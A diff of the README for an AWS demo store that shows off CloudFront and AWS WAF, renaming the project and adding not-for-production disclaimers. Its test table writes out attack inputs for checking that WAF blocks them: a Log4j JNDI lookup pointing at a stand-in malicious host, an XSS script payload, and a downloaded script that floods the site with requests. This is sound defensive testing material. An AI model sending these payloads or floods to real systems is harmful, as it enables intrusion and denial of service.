@@ -1,28 +1,34 @@
-# The Recycle Bin Boutique
-The Recycle Bin Boutique is fictitious online store that is accelerated by Amazon CloudFront and protected with AWS WAF, both part of AWS edge services. It's an educational project, that help developers in understanding the capabilities of AWS edge services. It can be used as a demo tool, and as a testing sandbox. The content of this online store , such as product names, descriptions and images are generated with the help of Anthropic's Sonnet model. The project is currently in experimental stage.
+# fast-secure-ecommerce-demo
+The Online Boutique is fictitious online store that is accelerated by Amazon CloudFront and protected with AWS WAF, both part of AWS Edge Services. It's an educational project, that help developers in understanding the capabilities of AWS Edge Services. It can be used as a demo tool, and as a testing sandbox. The project is currently in experimental stage.
 
-In this page, you can find details on the architecture of the boutique, how to deploy it, and the different recommended test scenarios. Note that these test scenarios cover a small percentage of the capabilities offered by AWS edge services.
+In this page, you can find details on the architecture of the boutique, how to deploy it, and the different recommended test scenarios. Note that these test scenarios cover a small percentage of the capabilities offered by AWS Edge Services.
 
-![The Recycle Bin Boutique](screenshot.jpeg)
+> [**IMPORTANT!**]
+> This sample serves as a reference or starting point for development purposes. It should not be directly utilized in production environments without proper testing and validation. Developers are responsible for thoroughly evaluating and modifying their code to ensure compliance with established security best practices and guidelines before deploying it to production systems.
+
+> [**IMPORTANT!**]
+> This repository provides a demonstration of specific WAF functionalities using illustrative test cases. It is crucial to understand that **this is not a production-ready solution**. For any real-world application, it is imperative to engage with your security team to design and implement robust WAF configurations that align with your organization's specific security requirements. Please be advised that the CloudFront distribution used in this demo is **intentionally configured to be publicly accessible for demonstration purposes**.  Exercise caution when adapting or extending this code for production use.
+
+<!-- ![](screenshot.jpeg) -->
 
 # How to deploy
 
-Follow these steps in your command line to deploy the boutique with CDK, using the region and account information configured in your AWS CLI. It takes around 10 mins.
+Follow these steps in your command line to deploy the boutique with CDK, using the region and account information configured in your AWS CLI. It takes around 10 minutes.
 
 ```javascript
-git clone https://github.com/achrafsouk/recycle-bin-boutique.git
-cd recycle-bin-boutique/store-infra
+git clone https://github.com/aws-samples/fast-secure-ecommerce-demo.git
+cd fast-secure-ecommerce-demo/store-infra
 npm install
 cdk deploy
 ```
 
-As prerequisite, you need to have CDK installed ```npm install -g aws-cdk ``` and bootstraped ```cdk bootstrap```. 
+As prerequisite, you need to have CDK installed ```npm install -g aws-cdk``` and bootstraped ```cdk bootstrap```. 
 
-Note the generated CloudFront domain name, and the load balancer domain name, you will use them in the test scenarios.
+Note the generated CloudFront domain name, and the load balancer domain name, as you will use them in the test scenarios.
 
 Current gotchas: 
 * Updating the stack will not update the web app installed on EC2. You will need to terminate the EC2 instances in the ASG, allowing the ASG to launch new ones.
-*  Since a CloudFront WAF WebACL must be deployed in us-east-1, regardless of the region of the CDK stack, I had to create a custom resource to deploy it. If you update the WAF configuration in CDK, it wont be reflected in a new CDK deploy, for the same reasons.
+* Since a CloudFront WAF WebACL must be deployed in us-east-1, regardless of the region of the CDK stack, we have to create a custom resource to deploy it. If you update the WAF configuration in CDK, it wont be reflected in a new CDK deploy, for the same reason.
 
 # Architecture
 
@@ -34,7 +40,7 @@ The backend of the boutique includes the following components:
 
 The backend is exposed to the internet through a CloudFront distribution and protected with AWS WAF. CloudFront Functions coupled with KeyValueStore, implement edge logic such as: A/B testing, redirections, image format detection, etc..
 
-![](rbb-diag.png)
+![](docs-images/architecture.png)
 
 
 # Edge security test scenarios
@@ -47,12 +53,12 @@ fields @timestamp, @message
 | limit 20
 ```
 
-| Test scenario  | Threat category  | How to test | 
-|:------------- |:--------------- | :-------------|
+| Test scenario | Threat category | How to test  | 
+|:------------- |:--------------- | :----------- |
 | Verify origin cloaking |**Protection bypass**| The Load balancer's security group is configured with CloudFront prefixlist, and the IP of the developer machine that deployed the CDK stack. On this developer machine, run the following curl command, and verify it works. Then go to Cloudshell in the AWS Console, and run the same command, and verify that the TCP connection was refused. <br/> ```curl -I http://xxxxxxxxx.xxxxx.elb.amazonaws.com```| 
 | Exploit Log4j CVE | **CVE exploit** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
 | Post malicious XSS payload | **Cross site scripting** | Log in (user: Joud, pwd: demo), then load any product page to post the following comment with an XSS payload, and verify that the request is blocked with 403 error code: <br/> ```<script><alert>Hello></alert></script>``` |
-| Rate limit with 400 threshold | **Denial of Service (DoS)** | Go to Cloudshell in the AWS Console, and run the following commands, to start a DoS from a single IP. Verify that within seconds of serving a 404 Not found from the backend, WAF starts responding with a 202 javascript challenge, then simply blocking with 403 response code after around 20 seconds of when the 400 request throshold was breached. <br/> ```wget https://raw.githubusercontent.com/achrafsouk/recycle-bin-boutique/main/scripts/rate-limit-test.sh``` <br/> ```bash rate-limit-test.sh https://xxxxxxxx.cloudfront.net/non_existing_page 400```|
+| Rate limit with 400 threshold | **Denial of Service (DoS)** | Go to Cloudshell in the AWS Console, and run the following commands, to start a DoS from a single IP. Verify that within seconds of serving a 404 Not found from the backend, WAF starts responding with a 202 javascript challenge, then simply blocking with 403 response code after around 20 seconds of when the 400 request throshold was breached. <br/> ```wget https://raw.githubusercontent.com/aws-samples/fast-secure-ecommerce-demo/main/scripts/rate-limit-test.sh``` <br/> ```bash rate-limit-test.sh https://xxxxxxxx.cloudfront.net/non_existing_page 400```|
 | Malicious IPs | **Distributed Denial of Service (DDoS)** | To overcome rate limits, attackers can use a large number of IPs to launch DDoS attacks. AWS curates IP lists based on their reputation, and provide them as WAF Managed rules. In this example, we challenge requests coming from am proxy server IPs (VPNs, Tor, etc..) with a CAPTCHA. To test it, load the homepage using a proxy website (e.g. https://www.blockaway.net), and verify that the page is challenged with a CAPTCHA. Note that this test might not succeed everytime, since proxy operators constantly evolve their IPs.|
 | Allow social media bots | **Inadvertly block desired bots** | Paste the home page link in one of the solial network (e.g. Linkedin) and verify that a preview has been correcrtly showed |
 | User-Agent classification | **Web scraping using HTTP libraries** | Go to Cloudshell in the AWS Console, and run the following ```curl``` command. Verify that WAF detects this HTTP library and blocks the request: <br/> ```curl -I https://xxxxxxxx.cloudfront.net/```|
@@ -81,9 +87,9 @@ Load the website in your browser, and open the Chrome developer tools to underst
 | **Image optimization** | Using the load balancer domain name, load the home page, check one of the product images, and verify that the ```Content-Type``` contains the value ```image/jpeg```. Check the image size. Do the same this time using the Cloudfront domain name, and verify that the ```Content-Type``` contains the value ```image/webp``` indicating that the image was compressed using the Image optimization component to Webp format. It will also be resized based on the size parameter sent by the NextJS <Image> component, that automatically selects the optimal image size based on the viewport. Check the image size, and compare it with the previous one. |
 | **Lazy loading** | Load the home page, and verify that some images are only loaded when you scroll down.  NextJS <Image> component only fetches images when they get near the visible part of the viewport, to reduce the amount of downloaded data. | 
 | **Real User Monitoring** |  Load a page, and check the telemetry sent to CloudWatch RUM. Go to CloudWatch RUM console and analyze the Core WebVitals of pages. | 
-| **A/B testing** | Load the home page, and verify that your session was assigned a ```user-segment``` cookie. This cookie is used to apply A/B testing experiments differently across user segments, in a sticky way. Create an experiment that includes your assigned user segment (e.g. 4), and your country code (e.g. AE for UAE) in the deployed KeyValueStore in the CloudFront Console, using the following config. Wait for a few seconds, and reload the home page. Validate that you are receicing the _v2_ version that includes a _Buy_ button. <br/> Key: ```/``` <br/> Value: ```{ "segments" : "1,2,3", "countries" : "AE,FR", "rules": { "rewrite_path" : "/index-v2" }}```| 
-| **HTTP redirection** | Load the following non existing campaign page: ```/MassiveSales2022```. Verify that 404 Not found is returned. Add the following http redirection rule to the deployed KeyValueStore in the CloudFront console, then validate that you are redirected to home page when loading this old campaign page <br/> Key: ```/MassiveSales2022``` <br/> Value: ```{ "rules": { "redirect" : "/sales" }}```| 
-| **Waiting room** | You will activate a waiting room for the cart page. Only logged premium users can actually access the cart page, the rest are showed the waiting room. To do this, add the following entry in the deployed KeyValueStore in the CloudFront console. Log with default user (user: Joud, pwd: demo) and verify that you have access to the cart page. Register a new non-premium user in a different browser, and verify that they do not have access to the cart. <br/> Key: ```/cart``` <br/> Value: ```{ "rules": { "waitroom" : { "location" : "/waitroom" } } }```|
+| **A/B testing** | Load the home page, and verify that your session was assigned a ```user-segment``` cookie. This cookie is used to apply A/B testing experiments differently across user segments, in a sticky way. Create an experiment that includes your assigned user segment (e.g. 4), and your country code (e.g. AE for UAE) in the deployed KeyValueStore in the CloudFront Console, using the following config. Wait for a few seconds, and reload the home page. Validate that you are receicing the _v2_ version that includes a _Buy_ button. <br/> Key: ```/``` <br/> Value: ```{ "segments": "1,2,3", "countries": "AE,FR", "rules": { "rewrite_path": "/index-v2" }}```| 
+| **HTTP redirection** | Load the following non existing campaign page: ```/MassiveSales2022```. Verify that 404 Not found is returned. Add the following http redirection rule to the deployed KeyValueStore in the CloudFront console, then validate that you are redirected to home page when loading this old campaign page <br/> Key: ```/MassiveSales2022``` <br/> Value: ```{ "rules": { "redirect": "/sales" }}```| 
+| **Waiting room** | You will activate a waiting room for the cart page. Only logged premium users can actually access the cart page, the rest are showed the waiting room. To do this, add the following entry in the deployed KeyValueStore in the CloudFront console. Log with default user (user: Joud, pwd: demo) and verify that you have access to the cart page. Register a new non-premium user in a different browser, and verify that they do not have access to the cart. <br/> Key: ```/cart``` <br/> Value: ```{ "rules": { "waitroom": { "location": "/waitroom" } } }```|
 | **Graceful failover** | Under construction |
 | **Speculation API** | The home page uses the specualtion rules API of the browser, to prerender product pages on whic the mouse hovers for over 200 ms. Go to the speculation rules tab in the Chrome developer tools, and check how a product page is pre-rendered when the mouse hovers over  |
 
@@ -94,7 +100,6 @@ Load the website in your browser, and open the Chrome developer tools to underst
 * Add Server timing headers to RUM
 * Add an observability option for CloudFront: CloudWatch or real time logs.
 * API using Lambda + OAC
-* Test https://github.com/jsdom/jsdom
 
 ## App code
 * Add more registration data (e.g. First and Last name)
@@ -113,7 +118,7 @@ Load the website in your browser, and open the Chrome developer tools to underst
 
 # Request flow
 
-![](rbb-flow.png)
+![](docs-images/request-flow.png)
 
 # Troubleshooting
 
@@ -129,12 +134,11 @@ If you want to test the boutique application locally, change the cdk deploy comm
 ```
 cdk deploy --outputs-file ../store-app/aws-backend-config.json
 ```
-In the generated file, remove the ```StoreInfraStack``` level from the json object. Then run the following commands:
+In the generated file, remove the ```StoreInfraStack``` level from the JSON object. Then run the following commands:
 ```
 cd store-app
 npm install
 npm run dev
 ```
 
-The boutique will be available on the localhost on port 3000
-
+The application will be available on localhost's port 3000.
